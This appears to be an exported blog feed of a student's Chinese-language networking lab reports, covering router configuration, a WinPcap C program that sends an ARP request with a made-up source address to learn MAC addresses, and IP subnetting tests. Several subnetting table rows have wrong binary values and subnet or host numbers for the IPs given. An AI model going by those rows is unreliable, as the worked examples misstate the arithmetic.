<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><ul>
<li><p>首先 win+r，输入services.msc打开服务，启动<strong>路由和远程访问</strong></p>
</li>
<li><p>为两台电脑<strong>配置IP和默认网关</strong></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第五次实验/image-20201212213728026.png"  alt="image-20201212213728026" style="zoom: 50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第五次实验/image-20201212213834153.png"  alt="image-20201212213834153" style="zoom: 50%;"></p>
</li>
<li><p>两台作为路由器的电脑需要配置单网卡多IP（在配置路由界面的<code>高级</code>选项中）</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第五次实验/image-20201212213752661.png"  alt="image-20201212213752661" style="zoom: 50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第五次实验/image-20201212213816735.png"  alt="image-20201212213816735" style="zoom:50%;"></p>
</li>
<li><p>在路由器上配置对应转发表</p>
</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212214319089.png"  alt="image-20201212214319089"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212214328695.png"  alt="image-20201212214328695"></p>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>使用<code>tracert</code>命令，跟踪路由转发过程</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第五次实验/image-20201212214251423.png"  alt="image-20201212214251423" style="zoom:50%;">

<p>结果与设计图相一致</p>
<h2 id="实验二：-仿真环境下的互联网组网与路由器配置"><a href="#实验二：-仿真环境下的互联网组网与路由器配置" class="headerlink" title="实验二： 仿真环境下的互联网组网与路由器配置"></a>实验二： 仿真环境下的互联网组网与路由器配置</h2><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><h4 id="实验准备-1"><a href="#实验准备-1" class="headerlink" title="实验准备"></a>实验准备</h4><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212222304929.png"  alt="image-20201212222304929"></p>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><ul>
<li><p>按照如示意图所示配置四个终端的IP和默认网关</p>
</li>
<li><p>配置路由器IP</p>
<ul>
<li><p>打开路由器的CLI界面，使用下图的指令分别配置两个路由器的接口Gig0/0、Gig0/1</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212220051367.png"  alt="image-20201212220051367"></p>
</li>
</ul>
</li>
<li><p>配置路由表</p>
<p>使用指令<code>ip route 目标网络 掩码 下一条IP地址</code>，在路由器的cli中添加表项</p>
<pre><code>- ip route 10.3.0.0 255.255.0.0 10.1.0.1
- ip route 10.2.0.0 255.255.0.0 10.1.0.2</code></pre><p>使用指令<code>show ip route</code>查看表项</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212221725169.png"  alt="image-20201212221725169"></p>
</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212222338110.png"  alt="image-20201212222338110"></p>
<h4 id="实验结果-1"><a href="#实验结果-1" class="headerlink" title="实验结果"></a>实验结果</h4><p>在其中一个终端的命令行中使用tracert命令追踪数据流</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212223031005.png"  alt="image-20201212223031005"></p>
<p>结果与设计图一致</p>
<h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><h4 id="实验准备-2"><a href="#实验准备-2" class="headerlink" title="实验准备"></a>实验准备</h4><p>使用与静态路由完全相同的拓扑图和IP配置</p>
<h4 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h4><ul>
<li><p>配置终端IP和网关（同静态路由配置）</p>
</li>
<li><p>配置RIP</p>
<ul>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212224056659.png"  alt="image-20201212224056659"></p>
</li>
<li><p>另一台路由器使用相同的方法配置，只是将直接相连的网络修改为10.3.0.0和10.1.0.0</p>
</li>
</ul>
</li>
</ul>
<h4 id="实验结果-2"><a href="#实验结果-2" class="headerlink" title="实验结果"></a>实验结果</h4><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201212224253930.png"  alt="image-20201212224253930"></p>
<p>连接成功</p>
<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>为了同时使用不同的网卡并在访问不同的物理网络时使用不同的网卡，可以配置主机的路由表以达到效果</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wpcap</tag>
        <tag>大三上学期课程内容</tag>
        <tag>网络技术与应用</tag>
      </tags>
  </entry>
  <entry>
    <title>网络技术与应用作业四 通过编程获取IP地址与MAC地址的对应关系</title>
    <url>/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="综合性实验（2）-通过编程获取IP地址与MAC地址的对应关系"><a href="#综合性实验（2）-通过编程获取IP地址与MAC地址的对应关系" class="headerlink" title="综合性实验（2） 通过编程获取IP地址与MAC地址的对应关系"></a>综合性实验（2） 通过编程获取IP地址与MAC地址的对应关系</h1><h2 id="实验内容说明"><a href="#实验内容说明" class="headerlink" title="实验内容说明"></a>实验内容说明</h2><p>通过编程获取IP地址与MAC地址的对应关系实验，要求如下：</p>
<p>（1）在IP数据报捕获与分析编程实验的基础上，学习WinPcap（NPcap）的数据包发送方法。</p>
<p>（2）通过WinPcap（或NPcap）编程，获取IP地址与MAC地址的映射关系。</p>
<p>（3）程序要具有输入IP地址，显示输入IP地址与获取的MAC地址对应关系界面。界面可以是命令行界面，也可以是图形界面，但应以简单明了的方式在屏幕上显示。</p>
<p>（4）编写的程序应结构清晰，具有较好的可读性。</p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="项目设计思路"><a href="#项目设计思路" class="headerlink" title="项目设计思路"></a>项目设计思路</h3><p>本次实验需要获取主机网卡中对应IP的MAC地址，可以利用ARP请求方法，过程如下</p>
<ol>
<li>获取网络接口卡列表，选择需要捕获MAC地址的网卡<strong>A</strong>（或选择对应的IP）</li>
<li><strong>伪造ARP请求报文S</strong>，内容要求如下：<ul>
<li>ARP请求</li>
<li>广播</li>
<li>伪造源MAC地址和源IP地址</li>
<li>目的IP地址为<strong>网卡A</strong>的IP地址</li>
</ul>
</li>
<li>用<strong>网卡A</strong>发送<strong>报文S</strong>‘</li>
<li>对<strong>网卡A</strong>进行流量监听，筛选其中的ARP报文（类型为0x806），捕获网卡A的<strong>ARP响应报文</strong>，在响应报文的<strong>帧首部源MAC地址</strong>部分可以看到发送该ARP响应的网卡对应的MAC地址</li>
</ol>
<ul>
<li><strong>注意：由于广播发送只能在相同网段的网卡内进行发送，而主机上各个网卡的IP可能并不在同一网段，例如子网掩码为255.255.255.0的两个IP192.168.89.1和192.168.240.1，不能接收到对方的广播消息。所以必须本次实验必须==使用相同的网卡发出和响应ARP报文==</strong></li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第四次实验/image-20201204155756073.png"  alt="image-20201204155756073" style="zoom: 33%;">

<h3 id="关键代码分析"><a href="#关键代码分析" class="headerlink" title="关键代码分析"></a>关键代码分析</h3><ul>
<li><p>获取设备列表</p>
<p>将设备列表存储至alldevs中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pcap_findalldevs_ex(pcap_src_if_string, <span class="literal">NULL</span>, &amp;alldevs, errbuf)</span><br></pre></td></tr></table></figure>
</li>
<li><p>打印网卡信息和对应IP</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">pcap_if_t</span>* d = alldevs; d != <span class="literal">nullptr</span>; d = d-&gt;next)<span class="comment">//显示接口列表</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取该网络接口设备的ip地址信息</span></span><br><span class="line">    <span class="keyword">for</span> (pcap_addr* a = d-&gt;addresses; a != <span class="literal">nullptr</span>; a = a-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (((struct sockaddr_in*)a-&gt;addr)-&gt;sin_family == AF_INET &amp;&amp; a-&gt;addr)</span><br><span class="line">        &#123;<span class="comment">//打印ip地址</span></span><br><span class="line">            i++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>, i);</span><br><span class="line">            <span class="comment">//打印相关信息</span></span><br><span class="line">            <span class="comment">//inet_ntoa将ip地址转成字符串格式</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s\t"</span>, d-&gt;name, d-&gt;description);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s\t%s\n"</span>, <span class="string">"IP地址:"</span>, inet_ntoa(((struct sockaddr_in*)a-&gt;addr)-&gt;sin_addr));</span><br><span class="line">            net[i] =d;</span><br><span class="line">            <span class="comment">//将ip列表存入数组，方便后面选择目的ip和组装数据包</span></span><br><span class="line">            <span class="built_in">strcpy</span>(ip[i], inet_ntoa(((struct sockaddr_in*)a-&gt;addr)-&gt;sin_addr));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印示例：</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201206000157645.png"  alt="image-20201206000157645"></p>
</li>
<li><p>打开网络接口卡</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pcap_t</span>* <span class="title">open</span><span class="params">(<span class="keyword">char</span>* name)</span><span class="comment">//打开网络接口</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pcap_t</span> *temp=pcap_open(name, <span class="number">65536</span>, PCAP_OPENFLAG_PROMISCUOUS, <span class="number">100</span>, <span class="literal">NULL</span>, errbuf);</span><br><span class="line">	<span class="keyword">if</span> (temp==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">	<span class="keyword">return</span> temp;<span class="comment">//返回一个指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pcap_t</span>* ahandle;<span class="comment">//发送arp请求的网卡</span></span><br><span class="line">ahandle = <span class="built_in">open</span>(net[index]-&gt;name);</span><br></pre></td></tr></table></figure>
</li>
<li><p>组装报文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//报文格式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)<span class="comment">//以1byte方式对齐</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FrameHeader_t</span> &#123;</span><span class="comment">//帧首部</span></span><br><span class="line">	BYTE DesMAC[<span class="number">6</span>];<span class="comment">//目的地址</span></span><br><span class="line">	BYTE SrcMAC[<span class="number">6</span>];<span class="comment">//源地址</span></span><br><span class="line">	WORD FrameType;<span class="comment">//帧类型</span></span><br><span class="line">&#125;FrameHeader_t;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ARPFrame_t</span> &#123;</span><span class="comment">//IP首部</span></span><br><span class="line">	FrameHeader_t FrameHeader;</span><br><span class="line">	WORD HardwareType;<span class="comment">//硬件类型</span></span><br><span class="line">	WORD ProtocolType;<span class="comment">//协议类型</span></span><br><span class="line">	BYTE HLen;<span class="comment">//硬件地址长度</span></span><br><span class="line">	BYTE PLen;<span class="comment">//协议地址长度</span></span><br><span class="line">	WORD Operation;<span class="comment">//操作类型</span></span><br><span class="line">	BYTE SendHa[<span class="number">6</span>];<span class="comment">//发送方MAC地址</span></span><br><span class="line">	DWORD SendIP;<span class="comment">//发送方IP地址</span></span><br><span class="line">	BYTE RecvHa[<span class="number">6</span>];<span class="comment">//接收方MAC地址</span></span><br><span class="line">	DWORD RecvIP;<span class="comment">//接收方IP地址</span></span><br><span class="line">&#125;ARPFrame_t;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//报文内容</span></span><br><span class="line">ARPFrame_t ARPFrame;</span><br><span class="line"><span class="comment">//将APRFrame.FrameHeader.DesMAC设置为广播地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    ARPFrame.FrameHeader.DesMAC[i] = <span class="number">0xff</span>;<span class="comment">//表示广播</span></span><br><span class="line"><span class="comment">//将APRFrame.FrameHeader.SrcMAC设置为本机网卡的MAC地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    ARPFrame.FrameHeader.SrcMAC[i] = <span class="number">0x0f</span>;</span><br><span class="line"></span><br><span class="line">ARPFrame.FrameHeader.FrameType = htons(<span class="number">0x806</span>);<span class="comment">//帧类型为ARP</span></span><br><span class="line">ARPFrame.HardwareType = htons(<span class="number">0x0001</span>);<span class="comment">//硬件类型为以太网</span></span><br><span class="line">ARPFrame.ProtocolType = htons(<span class="number">0x0800</span>);<span class="comment">//协议类型为IP</span></span><br><span class="line">ARPFrame.HLen = <span class="number">6</span>;<span class="comment">//硬件地址长度为6</span></span><br><span class="line">ARPFrame.PLen = <span class="number">4</span>;<span class="comment">//协议地址长为4</span></span><br><span class="line">ARPFrame.Operation = htons(<span class="number">0x0001</span>);<span class="comment">//操作为ARP请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将ARPFrame.SendHa设置为本机网卡的MAC地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    ARPFrame.SendHa[i] = <span class="number">0x0f</span>;</span><br><span class="line"><span class="comment">//将ARPFrame.SendIP设置为本机网卡上绑定的IP地址</span></span><br><span class="line">ARPFrame.SendIP = inet_addr(<span class="string">"122.122.122.122"</span>);</span><br><span class="line"><span class="comment">//将ARPFrame.RecvHa设置为0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">    ARPFrame.RecvHa[i] = <span class="number">0</span>;<span class="comment">//表示目的地址未知</span></span><br><span class="line"><span class="comment">//将ARPFrame.RecvIP设置为请求的IP地址</span></span><br><span class="line">ARPFrame.RecvIP = inet_addr(ip[index]);</span><br></pre></td></tr></table></figure>

<p><strong>注意：帧首部信息中的目的MAC地址为==全1==代表该条报文需要==广播==发送，而请求报文的目的MAC地址为==全0==表示==目的地址未知==</strong></p>
</li>
<li><p>发送消息</p>
<p>用ahandle网卡发送ARPFrame中的内容，报文长度为sizeof(ARPFrame_t)，如果发送成功，返回0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pcap_sendpacket(ahandle, (u_char*)&amp;ARPFrame, <span class="keyword">sizeof</span>(ARPFrame_t))</span><br></pre></td></tr></table></figure>
</li>
<li><p>捕获流量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)<span class="comment">//可能会捕获到多条消息</span></span><br><span class="line">		&#123;</span><br><span class="line">			pcap_pkthdr* pkt_header;</span><br><span class="line">			<span class="keyword">const</span> u_char* pkt_data;</span><br><span class="line">			<span class="keyword">int</span> rtn = pcap_next_ex(ahandle, &amp;pkt_header, &amp;pkt_data);</span><br><span class="line">			<span class="keyword">if</span> (rtn == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ARPFrame_t* IPPacket = (ARPFrame_t*)pkt_data;</span><br><span class="line">                <span class="keyword">if</span> (ntohs(IPPacket-&gt;FrameHeader.FrameType) == <span class="number">0x806</span>)</span><br><span class="line">                &#123;<span class="comment">//输出目的MAC地址</span></span><br><span class="line">                    <span class="keyword">if</span> (!compare(IPPacket-&gt;FrameHeader.SrcMAC, ARPFrame.FrameHeader.SrcMAC))<span class="comment">//不是一开始发送的广播arp请求</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">" MAC地址为:"</span>);</span><br><span class="line">                        <span class="comment">//输出MAC地址</span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%02x."</span>, IPPacket-&gt;FrameHeader.SrcMAC[i]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;<span class="comment">//找到MAc地址，退出</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取远程网卡的MAC地址</p>
<p>获取远程MAC地址有两个方法</p>
<ul>
<li><p>方法一：封装ARP请求时使用本机网卡的IP和MAC地址</p>
<ol>
<li><p>先利用上述方法请求本地网卡的MAC地址，将本机IP和MAC填入报文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ARPFrame.FrameHeader.SrcMAC[i] = IPPacket-&gt;FrameHeader.SrcMAC[i];</span><br><span class="line">ARPFrame.SendHa[i] = IPPacket-&gt;FrameHeader.SrcMAC[i];</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新发送ARP请求</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pcap_sendpacket(ahandle, (u_char*)&amp;ARPFrame, <span class="keyword">sizeof</span>(ARPFrame_t))</span><br></pre></td></tr></table></figure>

<p>注意这里会返回<strong>网关</strong>和<strong>远程主机的MAC地址</strong></p>
</li>
</ol>
</li>
<li><p>方法二：直接使用伪造的IP和MAC地址进行发送</p>
<p>虽然本机网卡发送时需用的是虚拟MAC和IP地址，但是网关接收到组建的ARP请求后会由网关发出一个ARP请求，找到本机发送网卡的真实IP和MAC地址，从而进一步获取远程主机的MAC。</p>
</li>
</ul>
</li>
</ul>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><ol>
<li><p>查询1（本机）：</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201206165835709.png"  alt="image-20201206165835709"></p>
<p>使用命令行进行查询</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201204161001694.png"  alt="image-20201204161001694"></p>
<p>结果一致</p>
</li>
<li><p>查询2（远程）：</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201206170601408.png"  alt="image-20201206170601408"></p>
<p> <img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201206170738918.png"  alt="image-20201206170738918"></p>
<p>结果一致</p>
</li>
<li><p>查询3（对应网关）</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201206170640547.png"  alt="image-20201206170640547"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wpcap</tag>
        <tag>大三上学期课程内容</tag>
        <tag>网络技术与应用</tag>
      </tags>
  </entry>
  <entry>
    <title>网络技术与应用作业三 IP地址规划与配置</title>
    <url>/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="验证性实验（2）IP地址规划与配置"><a href="#验证性实验（2）IP地址规划与配置" class="headerlink" title="验证性实验（2）IP地址规划与配置"></a>验证性实验（2）IP地址规划与配置</h1><h2 id="实验内容说明"><a href="#实验内容说明" class="headerlink" title="实验内容说明"></a>实验内容说明</h2><p>（1）对给定IP地址范围进行子网划分。</p>
<p>（2）在真实局域网和仿真局域网环境下手工完成IP地址分配，使用Ping命令测试分配不同IP地址时，网络的连通性。</p>
<p>（3）在仿真环境下配置DHCP协议，实现IP地址的自动配置。</p>
<h2 id="实验一-IP地址的子网划分"><a href="#实验一-IP地址的子网划分" class="headerlink" title="实验一 IP地址的子网划分"></a>实验一 IP地址的子网划分</h2><h3 id="真实环境"><a href="#真实环境" class="headerlink" title="真实环境"></a>真实环境</h3><ol>
<li><p>打开电脑A、B、C，关闭防火墙</p>
</li>
<li><p>IP地址与子网掩码的分配和连通性测试</p>
<p>统一使用IP：192.168.12.xxx，掩码：255.255.255.xxx，为简化说明过程，下表只给出IP和掩码的后八位</p>
</li>
</ol>
<table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
<th>子网掩码</th>
<th>子网号</th>
<th>主机号</th>
<th>最后八位的ip和掩码对应关系</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>193</td>
<td>192</td>
<td>3</td>
<td>1</td>
<td><font color="red"><strong>11</strong></font>00 0001</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1100 0000</td>
</tr>
<tr>
<td>B</td>
<td>194</td>
<td>192</td>
<td>3</td>
<td>2</td>
<td><font color="red"><strong>11</strong></font>00 0010</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1100 0000</td>
</tr>
<tr>
<td>C</td>
<td>67</td>
<td>192</td>
<td>1</td>
<td>3</td>
<td><font color="red"><strong>01</strong></font>00 0011</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1100 0000</td>
</tr>
</tbody></table>
<ol start="3">
<li><p>结果显示</p>
<ol>
<li><p>子网号相同的情况下可以ping通</p>
</li>
<li><p>子网号不同的情况下不可以ping通</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116141824375.png"  alt="image-20201116141824375" style="zoom: 50%;">





</li>
</ol>
</li>
</ol>
<h3 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h3><ol>
<li><p>拓扑图</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116142249348.png"  alt="image-20201116142249348" style="zoom: 50%;">
</li>
<li><p>IP和子网掩码的配置</p>
<p>统一使用IP：192.168.12.xxx，掩码：255.255.255.xxx，为简化说明过程，下表只给出IP和掩码的后八位</p>
<table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
<th>子网掩码</th>
<th>子网号</th>
<th>主机号</th>
<th>最后八位的ip和掩码对应关系</th>
<th>PC0是否能ping通</th>
</tr>
</thead>
<tbody><tr>
<td>PC0</td>
<td>201</td>
<td>192</td>
<td>3</td>
<td>9</td>
<td><font color="red"><strong>11</strong></font>00 1001</td>
<td>能</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1100 0000</td>
<td><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第三次实验/image-20201116144121429.png"  alt="image-20201116144121429" style="zoom: 100%;"></td>
</tr>
<tr>
<td>PC1</td>
<td>202</td>
<td>192</td>
<td>3</td>
<td>10</td>
<td><font color="red"><strong>11</strong></font>00 1001</td>
<td>能</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1100 0000</td>
<td><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116144222375.png"  alt="image-20201116144222375"></td>
</tr>
<tr>
<td>PC2</td>
<td>203</td>
<td>240</td>
<td>12</td>
<td>12</td>
<td><font color="red"><strong>1100</strong></font> 1011</td>
<td><font color="red">能</font></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1111 0000</td>
<td><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116144241351.png"  alt="image-20201116144241351"></td>
</tr>
<tr>
<td>PC3</td>
<td>220</td>
<td>192</td>
<td>3</td>
<td>28</td>
<td><font color="red"><strong>11</strong></font>01 1100</td>
<td>能</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1100 0000</td>
<td><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116144304584.png"  alt="image-20201116144304584"></td>
</tr>
<tr>
<td>PC4</td>
<td>221</td>
<td>240</td>
<td>13</td>
<td>13</td>
<td><font color="red"><strong>1101</strong></font> 1101</td>
<td>不能，子网号不同</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1111 0000</td>
<td><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116144336207.png"  alt="image-20201116144336207"></td>
</tr>
<tr>
<td>PC6</td>
<td>129</td>
<td>192</td>
<td>3</td>
<td>17</td>
<td><font color="red"><strong>10</strong></font>01 0001</td>
<td>不能，子网号不同</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>1100 0000</td>
<td><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201116145215006.png"  alt="image-20201116145215006"></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>PC4与PC6不能相互ping通，子网号和掩码不同</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
